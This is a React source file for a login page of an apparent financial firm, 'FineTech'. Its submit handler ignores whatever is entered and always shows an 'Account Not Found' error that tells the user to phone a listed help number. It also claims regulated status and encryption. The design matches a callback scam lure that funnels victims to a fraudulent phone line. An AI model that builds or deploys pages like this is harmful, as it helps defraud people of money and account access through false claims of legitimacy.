import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Separator } from "@/components/ui/separator";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { AlertTriangle } from "lucide-react";

export default function Index() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showError, setShowError] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setShowError(true);
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white">
      {/* Header */}
      <header className="border-b bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-sm">FT</span>
              </div>
              <span className="text-xl font-semibold text-gray-800">FineTech</span>
            </div>
            <nav className="hidden md:flex items-center space-x-6">
              <a href="#" className="text-gray-600 hover:text-blue-600 transition-colors">Personal</a>
              <a href="#" className="text-gray-600 hover:text-blue-600 transition-colors">Business</a>
              <a href="#" className="text-gray-600 hover:text-blue-600 transition-colors">Help</a>
            </nav>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-12">
        <div className="max-w-md mx-auto">
          {/* Logo and Title */}
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-blue-600 rounded-xl flex items-center justify-center mx-auto mb-4">
              <span className="text-white font-bold text-xl">FT</span>
            </div>
            <h1 className="text-2xl font-semibold text-gray-800 mb-2">Log in to your account</h1>
            <p className="text-gray-600">Enter your email and password to continue</p>
          </div>

          {/* Error Alert */}
          {showError && (
            <Alert className="mb-6 border-red-200 bg-red-50">
              <AlertTriangle className="h-4 w-4 text-red-600" />
              <AlertDescription className="text-red-800">
                <div className="font-medium mb-1">❌ Error 404 – Account Not Found</div>
                <div className="mb-2">We couldn't find an account matching your information.</div>
                <div className="mb-2">Please verify your login details.</div>
                <div className="text-sm">For assistance, contact Help: +1-833-251-8091</div>
              </AlertDescription>
            </Alert>
          )}

          {/* Login Form */}
          <Card className="shadow-lg border-0">
            <CardHeader className="pb-4">
              <div className="text-center">
                <p className="text-sm text-gray-600">Welcome back</p>
              </div>
            </CardHeader>
            <CardContent className="space-y-6">
              <form onSubmit={handleLogin} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="email" className="text-sm font-medium text-gray-700">Email address</Label>
                  <Input
                    id="email"
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Enter your email"
                    className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                    required
                  />
                </div>
                
                <div className="space-y-2">
                  <Label htmlFor="password" className="text-sm font-medium text-gray-700">Password</Label>
                  <Input
                    id="password"
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Enter your password"
                    className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                    required
                  />
                </div>

                <Button 
                  type="submit" 
                  className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition-colors"
                >
                  Log In
                </Button>
              </form>

              <div className="text-center">
                <a href="#" className="text-sm text-blue-600 hover:text-blue-700 transition-colors">
                  Forgot your password?
                </a>
              </div>

              <Separator />

              <div className="text-center space-y-4">
                <p className="text-sm text-gray-600">Don't have an account?</p>
                <Button 
                  variant="outline" 
                  className="w-full h-12 border-blue-600 text-blue-600 hover:bg-blue-50 font-medium rounded-lg transition-colors"
                >
                  Sign Up
                </Button>
              </div>
            </CardContent>
          </Card>

          {/* Security Notice */}
          <div className="mt-8 text-center">
            <p className="text-xs text-gray-500">
              Your information is secure and encrypted. We use industry-standard security measures to protect your data.
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t bg-gray-50 mt-16">
        <div className="container mx-auto px-4 py-8">
          <div className="text-center space-y-4">
            <div className="flex justify-center space-x-6 text-sm text-gray-600">
              <a href="#" className="hover:text-blue-600 transition-colors">Privacy Policy</a>
              <a href="#" className="hover:text-blue-600 transition-colors">Terms of Service</a>
              <a href="#" className="hover:text-blue-600 transition-colors">Contact Us</a>
              <a href="#" className="hover:text-blue-600 transition-colors">Security Center</a>
            </div>
            <p className="text-xs text-gray-500">
              © 2024 FineTech. All rights reserved. Licensed and regulated financial services provider.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
